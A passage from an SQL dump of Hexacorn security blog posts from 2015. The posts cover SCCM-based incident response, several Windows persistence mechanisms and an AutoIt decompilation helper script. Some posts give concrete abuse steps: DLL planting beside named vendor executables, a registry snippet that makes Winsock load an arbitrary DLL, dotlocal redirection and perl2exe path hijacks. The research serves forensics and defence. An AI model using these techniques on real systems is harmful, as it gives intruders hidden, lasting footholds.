for:\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=nmap.exe\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=psexec.exe\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=psexesvc.exe\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=tor.exe\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=vidalia.exe\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=%25torrent%25.exe\nhttp://<SCCM>/Report.asp?ReportID=<###>&variable=[0-9][0-9][0-9].exe\nThe last 2 examples contain wildcards (looking for torrent clients) and regular expressions (looking for 3-digit file names) – it is very handy that these are supported by SCCM – they not only help us with more complicated queries, but also narrow down the results (otherwise the time out will tell you your query was not that good  ).\nOnce you define what queries you want to run on regular basis you can automate it using Visual Basic Script, python, or whatever else you like. You can also start building white lists or exclusions lists. This is because SCCM has a tendency to keep some records ‘forever’ and even if you clean up the system sometimes you may find some old records ‘hanging’ in SCCM for a very long time. You can either delete them manually directly from SCCM DB, or just keep them there, and also use the aforementioned ‘ignore’ lists to automatically exclude these known systems / files from the output of your parser. Going even further you can report it to SIEM, or you can start sending alerts via email.\nThe web based report is cool, but it has a serious limitation. It only accepts very simple queries. You can add more fields to the form (e.g. location), but still, it will be quite difficult to use it on regular basis. This is because the inner workings of this form rely on a very simple SELECT query.\nIf you want more (and you should), the natural progression is therefore talking directly to the SQL Database. Once you know the DB schema you can start creating very specific queries f.ex.:\n\nShow me all files added to any system that are dropped under c:\\windows within last 8h\nShow me all files dropped under user profile\nShow me all files with a single letter file name\nShow me all files made up of digits only\netc.\n\nUsing time intervals you can build automatic reports about all .exe files added within last XYZ hours. Eyeballing this may be a bit tricky (don’t be surprised to see gazillions of new .exes landing in your corporate environment every day), so implementing some ‘ignore’ lists may really come handy. In any case, the sky is the limit here and a bunch of SCCM queries ran on regular basis can become a very strong complementary detective security control. Note that you don’t need to install anything, build anything, run sweeps, etc. It’s all there, juicy data waiting to be queried.\nBtw. if you are wondering why I am not providing example SQL queries it is because they will vary. Table names are usually organization-specific. If you are curious you can just google around for “sccm sql SoftwareFile” and you will find plenty of examples.\nWhile SCCM can’t be obviously as flexible as a dedicated IR solution it can give you an edge if you don’t have plans /or budget/ to deploy something more IR-centric. Apart from a typical malware / hacking angle, it may also help you to keep systems ‘clean’ for auditing purposes, discover malicious insiders, and perhaps even win a few brownie points from your management.\nShare this :)', 'Compromise Detection, Forensic Analysis, Malware Analysis, Security Control', 'http://www.hexacorn.com/blog/2015/01/30/sccm-system-center-configuration-manager-and-incident-response-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (248, 'Permanent Link to Beyond good ol’ Run key, Part 26', 'Hexacorn', 'January 28, 2015 ', 'Today I cheated. I wrote two posts in a go, because 25 is not that interesting from the persistence perspective.\nSo, as promised 5 minutes ago, this post is about yet another Frankenstein’s monster. It focuses on a bug that I have already covered, but intentionally didn’t explore its most crazy aspect yet.\nBugs in dynamically loaded libraries are surely interesting, but even more interesting are the bugs in the libraries that are linked statically.\nWhy?\nBecause patching these is really hard and you can’t just submit a single patch to fix it all (unless you do some magic).\nSo, as mentioned above – the very same code that we have explored in the part 21 inside the MFC libraries is present in many popular applications as it’s linked with them statically.\nThis is bad news.\nThe result is that finding such vulnerable applications can give an attacker a myriad of persistence opportunities as all he has to do is to find a vulnerable static library pattern in a .exe or .dll and drop a ‘localization DLL’ in a respective directory. Yes, the statically linked code has a side effect and loads localization DLLs for DLLs as well. So if your foo.dll contains the vulnerable code, dropping fooENU.dll or fooLOC.dll on English system will ensure they are loaded as well.\nThere are really a lot of applications containing this buggy code. Looking through a couple of apps I was able to quickly spot them inside many omnipresent executables and DLLs.\nSo, without further ado, this is a very short list of files that I found to contain the specific vulnerable code:\n\n%APPDATA%\\Local\\Akamai\\ControlPanel.exe\n\n%APPDATA%\\Local\\Akamai\\ControlPanelENU.dll\n%APPDATA%\\Local\\Akamai\\ControlPanelLOC.dll\n\n\nc:\\Program Files (x86)\\HP\\HP Software Update\\hpwucli.exe\n\nC:\\Program Files (x86)\\HP\\HP Software Update\\hpwucliENU.dll\nC:\\Program Files (x86)\\HP\\HP Software Update\\hpwucliLOC.dll\n\n\nc:\\Program Files\\Realtek\\Audio\\HDA\\RtHDVCpl.exe\n\nC:\\Program Files\\Realtek\\Audio\\HDA\\RtHDVCplENU.dll\nC:\\Program Files\\Realtek\\Audio\\HDA\\RtHDVCplLOC.dll\n\n\nc:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64.exe\n\nC:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64ENU.dll\nC:\\Program Files\\Realtek\\Audio\\HDA\\RtkNGUI64LOC.dll\n\n\nc:\\Program Files (x86)\\Western Digital\\WD Utilities\\WDDriveUtilitiesHelper.exe\n\nC:\\Program Files (x86)\\Western Digital\\WD Utilities\\WDDriveUtilitiesHelperENU.dll\nC:\\Program Files (x86)\\Western Digital\\WD Utilities\\WDDriveUtilitiesHelperLOC.dll\n\n\nC:\\Program Files\\Western Digital\\WD SmartWare\\WD Quick Formatter.exe\n\nC:\\Program Files\\Western Digital\\WD SmartWare\\WD Quick FormatterENU.dll\nC:\\Program Files\\Western Digital\\WD SmartWare\\WD Quick FormatterLOC.dll\n\n\nc:\\Program Files (x86)\\ATI Technologies\\ATI.ACE\\Core-Static\\SLSTaskbar.exe\n\nC:\\Program Files (x86)\\ATI Technologies\\ATI.ACE\\Core-Static\\SLSTaskbarENU.dll\nC:\\Program Files (x86)\\ATI Technologies\\ATI.ACE\\Core-Static\\SLSTaskbarLOC.dll\n\n\n\nAs you can see a few prominent vendors. It works for both 32- and 64-bit applications and DLLs.\nThis is a tip of the iceberg of course and if you scan any average hard drive you will surely find at least one vulnerable app like this.\nI guess there may be even cases where such localization DLL can lead to an escalation of privileges if any of the vulnerable components is executed/loaded by a more privileged process/account.\nShould this be reported as a vulnerability? Yes. But I really don’t know to who.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/28/beyond-good-ol-run-key-part-26/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (249, 'Permanent Link to Beyond good ol’ Run key, Part 25', 'Hexacorn', 'January 28, 2015 ', 'I have already covered persistence mechanisms that rely on localization features implemented by popular programming platforms (MFC and Visual Basic). These features support localization efforts by automatically loading language-specific DLLs anytime a program written in any of these platforms starts.\nYou may (or not) be wondering if there is more to it.\nWhat may immediately come to mind here is a simple question: what about Delphi (or more broadly: what about Borlandish apps)?\nWhen the Borlandish application is executed it queries very characteristic registry keys that you may see in the Process Monitor anytime you start f.ex. a Delphi application:\n\n\nHKCU\\Software\\Borland\\Locales\n\n\nHKLM\\Software\\Borland\\Locales\n\n\nHKCU\\Software\\Borland\\Delphi\\Locales\n\n\nOther (newer) Borlandish applications may include not only Delphi reference, but also Code Gear and Embarcadero:\n\n\nHKCU\\Software\\CodeGear\\Locales\n\n\nHKCU\\Software\\Embarcadero\\Locales\n\n\nand query them as well. These keys are queried for an entry which is a full path of the executed application e.g. for c:\\foo.exe it could be:\n\n\nHKCU\\Software\\Borland\\Locales\n\n\nc:\\foo.exe = abc\n\n\n\n\nIf such entry exists, it should contain a value maximum 5 bytes long and identify a file extension of the requested localization library. In our example it is ‘abc’. The file extension will then be appended to the file name of the application (after removing the original file extension, typically ‘.exe’). Notably, if the entry is not there, or more than 5 bytes long the application will try to use the value of a Deafult key under\n\n\nHKCU\\Software\\Borland\\Locales\n\n{Default} = def\n\n\n\nIf none of the 2 values exist, the file extension for the localization DLL will be based on the current locale for the calling thread e.g. for English it could be .ENU, .EN.\nOnce the file extensions are sorted the program will call LoadLibraryEx API and attempt  to load the localization DLL as follows:\n\n<appname>.<file extension> if Locale registry entries exist\n<appname>.ENU – if the above fails\n<appname>.EN – if the above fails\n\nAlso, as a side effect of the way LoadLibraryEx works, the API will query for the following DLL names and will load them if .ENU/.EN files don’t exist (respectively):\n\n<appname>.ENU.DLL\n<appname>.EN.DLL\n\nThe good news is that all these libraries are loaded using LoadLibraryEx functions with the LOAD_LIBRARY_AS_DATAFILE flag. So, while Borlandish apps do support external localization DLLs they load them properly i.e. not as a code, but as data. As far as I can tell this was implemented correctly from the very first version of Delphi that supported localized DLLs.\nThat pretty much kills the idea of using such DLLs as a persistence mechanism.\nWell sort of, you could always use a pattern matching to find a DLL loading routine in the existing Borlandish binary and patch it. Patch requires a flip of a single bit to disable LOAD_LIBRARY_AS_DATAFILE (0x2) – this would enable loading of localization DLLs as a code.  Quite honestly, this is lame and while it could be a good idea a decade ago or so, now any modification to an existing .exe will most likely trigger an AV alert (since it looks like a possible viral infection).\nSo, while it’s not really a persistence mechanism it was still worth exploring even if just for the sake of ruling it out and understanding what these Locales keys are.\nIf you are a bit disappointed I can only say that the topic of this post leads us directly to the part 26. It will be about yet another Frankenstein’s Monster \nStay tuned.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/28/beyond-good-ol-run-key-part-25/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (250, 'Permanent Link to Beyond good ol’ Run key, Part 24', 'Hexacorn', 'January 13, 2015 ', 'Ability to load a DLL of your choice anytime someone is connecting to the internet is something that definitely deserves some attention. This is why I will describe here yet another obscure mechanism that can be abused for malicious purposes. Courtesy of Winsock 2 library (ws2_32.dll).\nWhen Winsock library connects to the internet it ‘talks’ to various service providers and probes them for connectivity services. It’s actually pretty complex and I won’t pretend that I fully understand what’s going on there yet there is one thing which this library does that I do understand \nAt some stage it attempts to load a DLL as specified by the following Registry key:\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\AutodialDLL\nThis key is quite obscure and Microsoft only describes it in a context of a very old vulnerability MS06-041.\nTurns out that the AutodialDLL entry points to a DLL that WinSock will load anytime it connects to the internet.\nThe DLL needs to export 3 functions:\n\nWSAttemptAutodialAddr\nWSAttemptAutodialName\nWSNoteSuccessfulHostentLookup\n\nThe result of loading the following registry key:\nWindows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters] \"AutodialDLL\"=\"c:\\\\temp\\\\foo.dll\"\nand dropping the file\nc:\\temp\\foo.dll\n(the DLL exports the aforementioned APIs) can be seen below:\n\nThe screenshot was taken from a Windows XP system – I simply opened and closed Internet Explorer.\nOf course, it works on Windows 10 too – just access to HKLM is slightly more difficult \n\n \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/13/beyond-good-ol-run-key-part-24/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (251, 'Permanent Link to Beyond good ol’ Run key, Part 23', 'Hexacorn', 'January 9, 2015 ', 'Today I will talk about something that can be called ‘the god of all persistence mechanisms’. One that is so powerful that can use pretty much any .exe on your system as a persistence mechanism.\nIt’s called dotlocal (.local).\nIf you run Process Monitor often enough you will (sooner or later) discover that anytime you launch an .exe the system will always try to find a file or a directory called <filename.exe>.local.\nThat – my friend – is a debugging feature.\nIt is a redirection mechanism designed to test COM objects and pretty much means that if either a file or directory named <filename.exe>.local exists the OS will understand it as a ‘testing in progress’ signal and will attempt to load DLLs from a different directory than usual. In other words, it will search for dependent DLL libraries in a path different from the typical DLL search order. This allows us to intercept pretty much any DLL dependency we wish except for these that are listed under KnownDLLs registry key (HKLM\\CurrentControlSet\\Control\\Session Manager\\KnownDlls).\nFor the sake of a demo, I will show you a very stupid example using the least malicious program on your system called… Notepad.\nNotepad relies on a couple of libraries, most of them are present on the Known DLLs list (can’t be abused unless you remove them from the Registry and reboot the system); except for comctl32.dll. This library has many versions and thanks to that requires a dedicated entry in the manifest solving the so-called DLL hell problem:\n<dependency>\r\n    <dependentAssembly>\r\n        <assemblyIdentity\r\n            type=\"win32\"\r\n            name=\"Microsoft.Windows.Common-Controls\"\r\n            version=\"6.0.0.0\"\r\n            processorArchitecture=\"x86\"\r\n            publicKeyToken=\"6595b64144ccf1df\"\r\n            language=\"*\"\r\n        />\r\n    </dependentAssembly>\r\n</dependency>\nThe practical implication of this manifest file is that OS will try to load the following comctl32.dll file (on Windows XP)\nx86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\\comctl32.dll\nlocated inside the Windows directory (c:\\WINDOWS\\WinSxS\\).\nIntroducing a directory c:\\windows\\system32\\notepad.exe.local we can force the OS to leverage the dotlocal ‘feature’ and load the following ‘malicious’ library instead:\nc:\\WINDOWS\\system32\\notepad.exe.local\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\\comctl32.dll\nIt works on Windows 10 too, except that it will be loaded from a different path:\nc:\\WINDOWS\\system32\\notepad.exe.local\\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.9841.0_none_38d154a85935aa0a\\comctl32.dll\nThe following example shows the moment of a malicious DLL loaded via dotlocal mechanism into a Notepad session on Windows 10.\n\nNotepad obviously crashes, cuz I was lazy and just implemented a dummy comctl32.dll, but in a real-case scenario one could hide the presence of such a malicious DLL by using it as a proxy and redirecting all API calls to the legitimate comctl32.dll DLL.\n\nIn other words, dropping the malicious comctl32.dll in these directories on respective systems will ensure that these malicious DLLs are loaded anytime someone starts Notepad.\nNow, for the scary part. Notepad was a stupid example as it requires admin rights to write to c:\\WINDOWS\\system32\\notepad.exe.local\\ on Windows 10, but any file outside of areas protected by system is a much easier target.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/09/beyond-good-ol-run-key-part-23/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (252, 'Permanent Link to Decompiling compiled AutoIT scripts (64-bit), take two', 'Hexacorn', 'January 8, 2015 ', 'A while ago I posted a short description on how to decompile 64-bit autoit scripts. Someone pinged me asking on how to actually do it, so I thought it will be handy to simply write a script to do the dirty work for us.\n\nDownload 32-bit AutoIt (older version has the 32-bit stub separately, so it’s handy to use it)\n\nhttps://www.autoitscript.com/autoit3/files/archive/autoit/autoit-v3.2.8.1.zip\n\n\nUnpack it\nYou will find the 32-bit stub here:\n\nautoit-v3.2.8.1.zip\\Aut2Exe\\AutoItSC.bin\n\n\nCopy it to the folder where your 64-bit compiled autoit executable resides\nNow you have to build a 32-bit executable using the autoit script blob you need to extract from the 64-bit executable\n\nyou can do it manually, or\nyou can run the perl script below (what it does it extracts the autoit script blob from the 64-bit autoit executable and builds the 32-bit equivalent using the AutoItSC.bin stub mentioned above which is 32-bit); the created file will have a file name:\n\n\n<filename>.a32.exe\n\n\n\n\n\nNow you can download the Decompiler for AutoIt script from https://exe2aut.com/?download\nDrop it into some virtual environment (VMWare/VirtualBox/Virtual PC)\nDrop your newly created 32-bit executable into exe2aut decompiler\nIt should decrypt the script for you\n\nAnd the 64-to-32 conversion script is shown below (call it autoit64to32.pl or whatever and run perl autoit64to32.pl <64-bit exe>):\nuse strict;\r\nuse warnings;\r\n\r\nmy $f=shift || die (\"Gimme a file name!\");\r\n\r\nprint STDERR \"Processing \'$f\':\\n\";\r\nprint STDERR \"- Reading \'AutoItSC.bin\'\\n\";\r\nopen F,\"<AutoItSC.bin\";\r\nbinmode F;\r\nread F,my $a, -s \'AutoItSC.bin\';\r\nclose F;\r\n\r\nprint STDERR \"- Reading \'$f\'\\n\";\r\nopen F,\"<$f\";\r\nbinmode F;\r\nread F,my $d, -s $f;\r\nclose F;\r\n\r\nprint STDERR \"- Looking for the script\\n\";\r\nif ($d=~/\\xA3\\x48\\x4B\\xBE\\x98\\x6C\\x4A\\xA9\\x99\\x4C\\x53\\x0A\\x86\\xD6\\x48\\x7D/sg)\r\n{\r\n   my $pd=(pos $d)-16;\r\n   print STDERR \"- Script found @ \".sprintf(\"%08lX\",$pd).\"\\n\";\r\n   print STDERR \"- Creating 32-bit version \'$f.a32.exe\'\\n\";\r\n   open F,\">$f.a32.exe\";\r\n   binmode F;\r\n   print F $a.substr($d,$pd,length($d)-$pd);\r\n   close F;\r\n}\r\nelse\r\n{\r\n   print STDERR \"- Script not found !\\n\";\r\n}\r\n\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/08/decompiling-compiled-autoit-scripts-64-bit-take-two/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (253, 'Permanent Link to Beyond good ol’ Run key, Part 22', 'Hexacorn', 'January 6, 2015 ', 'Perl2exe executables are perl programs embedded inside the executable wrapper that allows making the script ‘portable’ and easy to execute without a need of installing any perl interpreter.\nIt turns out that the way it loads things is kinda ‘open-minded’ i.e. it tries to look for loadable stuff all over the place – because of this ‘feature’ it is possible to abuse it and create yet another (bizarre) persistence mechanism (actually, plenty of them).\nAs an example, we can look at a very old hdd.exe perl2exe program – I got it from a friend back in a day – it display info about the HDD properties. Running it under procmon shows a lot of interesting artifacts related to files and directories that are… not found on the system.\nFor the sake of the demonstration, I will show only 2 hijacks, but if you browse through the log below you will find a lot of other potential phantom file names and directories that could be abused this way.\nExample #1\nCreating a ‘(null)’ directory in the same place where the perl2exe file is executed and dropping a sitecustomize.pl perl script inside it will lead to the perl script being executed when perl2exe is launched:\n\n(null)\\sitecustomize.pl containing just a simple line\n\nprint “Foobar\\n”;\n\n\n\n\nExample #2\nYou can create f.ex. PERL2EXE_STORAGE\\auto\\Cwd\\Cwd.dll – while it is perl2exe-specific module (since it requires CWD module to be used), it’s quite a popular module anyway so it could be a good target:\nAnd in debug view:\nLast, but not least – the (edited) log…\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\5.8.8\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\5.8.8\\\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\5.8.8\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\5.8.8\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\5.8.8\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\5.8.8\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\5.8.8\r\nQueryOpen                     %SCRIPT_PATH%\\5.8.8\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\5.8.8\r\nQueryDirectory                %SCRIPT_PATH%\\5.8.8\r\nQueryOpen                     %SCRIPT_PATH%\\5.8.8\r\nCreateFile                    %SCRIPT_PATH%\\MSWin32-x86-multi-thread\r\nQueryDirectory                %SCRIPT_PATH%\\MSWin32-x86-multi-thread\r\nQueryOpen                     %SCRIPT_PATH%\\MSWin32-x86-multi-thread\r\nCreateFile                    %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\5.8.8\\MSWin32-x86-multi-thread\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\5.8.8\r\nQueryOpen                     %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\5.8.8\\MSWin32-x86-multi-thread\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\5.8.8\r\nQueryDirectory                %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\5.8.8\r\nQueryOpen                     %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\5.8.8\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\MSWin32-x86-multi-thread\r\nQueryDirectory                %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\MSWin32-x86-multi-thread\r\nQueryOpen                     %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\MSWin32-x86-multi-thread\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\(null)\\sitecustomize.pl\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\(null)\\\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\(null)\\sitecustomize.pl\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Cwd\\Cwd.dll\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Cwd\\\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Cwd\\Cwd.dll\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Cwd\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Cwd\r\nCreateFile                    %SCRIPT_PATH%\\auto\\Cwd\r\nCreateFile                    %SCRIPT_PATH%\\auto\r\nQueryOpen                     %SCRIPT_PATH%\\auto\\Cwd\r\nCreateFile                    %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\auto\\Cwd\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\auto\r\nQueryOpen                     %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\auto\\Cwd\r\nCreateFile                    %SCRIPT_PATH%\\auto\\Cwd\r\nCreateFile                    %SCRIPT_PATH%\\auto\r\nQueryOpen                     %SCRIPT_PATH%\\auto\\Cwd\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\DynaLoader\\dl_findfile.al\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\DynaLoader\\\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\DynaLoader\\dl_findfile.al\r\nCreateFile                    %SCRIPT_PATH%\\-L%USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\r\nCreateFile                    %SCRIPT_PATH%\\-L%USERPROFILE%\\LOCALS~1\\Temp\\\r\nQueryOpen                     %SCRIPT_PATH%\\-L%USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nQueryDirectory                %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nCreateFile                    %SCRIPT_PATH%\\Cwd.dll\r\nQueryDirectory                %SCRIPT_PATH%\\Cwd.dll\r\nQueryOpen                     %SCRIPT_PATH%\\Cwd.dll\r\nCreateFile                    %SCRIPT_PATH%\\Cwd.dll\r\nQueryDirectory                %SCRIPT_PATH%\\Cwd.dll\r\nQueryOpen                     %SCRIPT_PATH%\\Cwd.dll\r\nCreateFile                    %SCRIPT_PATH%\\libCwd.dll\r\nQueryDirectory                %SCRIPT_PATH%\\libCwd.dll\r\nQueryOpen                     %SCRIPT_PATH%\\libCwd.dll\r\nCreateFile                    %SCRIPT_PATH%\\Cwd\r\nQueryDirectory                %SCRIPT_PATH%\\Cwd\r\nQueryOpen                     %SCRIPT_PATH%\\Cwd\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\r\nQueryAllInformationFile       %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\Cwd.dll\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\Cwd.bs\r\nQueryDirectory                %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\Cwd.bs\r\nQueryOpen                     %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\Cwd.bs\r\nCreateFile                    C:\\bin\\pwd\r\nCreateFile                    C:\\bin\r\nQueryOpen                     C:\\bin\\pwd\r\nCreateFile                    C:\\usr\\bin\\pwd\r\nCreateFile                    C:\\usr\\bin\\\r\nQueryOpen                     C:\\usr\\bin\\pwd\r\nCreateFile                    C:\\QOpenSys\\bin\\pwd\r\nCreateFile                    C:\\QOpenSys\\bin\\\r\nQueryOpen                     C:\\QOpenSys\\bin\\pwd\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Win32\\OLE\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Win32\\\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\\auto\\Win32\\OLE\r\nCreateFile                    %SCRIPT_PATH%\\auto\\Win32\\OLE\r\nCreateFile                    %SCRIPT_PATH%\\auto\\Win32\\\r\nQueryOpen                     %SCRIPT_PATH%\\auto\\Win32\\OLE\r\nCreateFile                    %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\auto\\Win32\\OLE\r\nCreateFile                    %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\auto\\Win32\\\r\nQueryOpen                     %USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\\auto\\Win32\\OLE\r\nCreateFile                    %SCRIPT_PATH%\\auto\\Win32\\OLE\r\nCreateFile                    %SCRIPT_PATH%\\auto\\Win32\\\r\nQueryOpen                     %SCRIPT_PATH%\\auto\\Win32\\OLE\r\nCreateFile                    %SCRIPT_PATH%\\-L%USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\r\nCreateFile                    %SCRIPT_PATH%\\-L%USERPROFILE%\\LOCALS~1\\Temp\\\r\nQueryOpen                     %SCRIPT_PATH%\\-L%USERPROFILE%\\LOCALS~1\\Temp\\p2xtmp-1736\r\nCreateFile                    %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nQueryDirectory                %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nQueryOpen                     %SCRIPT_PATH%\\PERL2EXE_STORAGE\r\nCreateFile                    %SCRIPT_PATH%\\OLE.dll\r\nQueryDirectory                %SCRIPT_PATH%\\OLE.dll\r\nQueryOpen                     %SCRIPT_PATH%\\OLE.dll\r\nCreateFile                    %SCRIPT_PATH%\\OLE.dll\r\nQueryDirectory                %SCRIPT_PATH%\\OLE.dll\r\nQueryOpen                     %SCRIPT_PATH%\\OLE.dll\r\nCreateFile                    %SCRIPT_PATH%\\libOLE.dll\r\nQueryDirectory                %SCRIPT_PATH%\\libOLE.dll\r\nQueryOpen                     %SCRIPT_PATH%\\libOLE.dll\r\nCreateFile                    %SCRIPT_PATH%\\OLE\r\nQueryDirectory                %SCRIPT_PATH%\\OLE\r\nQueryOpen                     %SCRIPT_PATH%\\OLE\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\r\nQueryAllInformationFile       %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\OLE.dll\r\nCreateFile                    %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\OLE.bs\r\nQueryDirectory                %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\OLE.bs\r\nQueryOpen                     %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\OLE.bs\r\nQueryOpen                     %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\WS2_32.dll\r\nQueryOpen                     %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\\WS2HELP.dll\r\nSetDispositionInformationFile %USERPROFILE%\\Local Settings\\Temp\\p2xtmp-1736\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2015/01/06/beyond-good-ol-run-key-part-22/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (254, 'Permanent Link to When you are a temp your days are often numbered. So are your file names. Part 1', 'Hexacorn', 'January 5, 2015 ', 'Many application create temp files. In the past it was completely random and various directories were chosen depending on application developer’s whim, nowadays the file names are often somehow predictable (as long as the app is legitimate, that is) and both placed inside the %TEMP% folder and named using a pattern that contains a unique prefix followed by a digit, or a number. We can quite often encounter them during forensic investigations. And if you are wondering how these temp. files are created – the applications that know how to behave typically use a Windows API called GetTempFileName; it allows programmers to specify a prefix used by temporary files used by their application. Programmers often specify prefix longer than 3 characters, but the API is using only the first 3 characters as explained in the API description on MSDN:\nlpPrefixString [in]\nThe null-terminated prefix string. The function uses up to the first three characters of this string as the prefix of the file name. This string must consist of characters in the OEM-defined character set.\nIt may be handy to get familiar with a few well-known temporary file names and prefixes as it may allow us to recognize specific temporary file names families, and potentially use this knowledge to reduce data for analysis (of course, don’t do it blindly).\nThe list below contains popular temp. file names / prefixes – I am also including other well-known temporary file names:\n\nC:\\~GLC1034.TMP – side-effect of running Wise Installer; stage 2\n%TEMP%\\<digits>.tmp – typically caused by GetTempFileName API called with an empty prefix (or, file is created ‘manually’)\n%TEMP%\\7zS<digits>.tmp – side-effect of running Self-Extracting installer based on 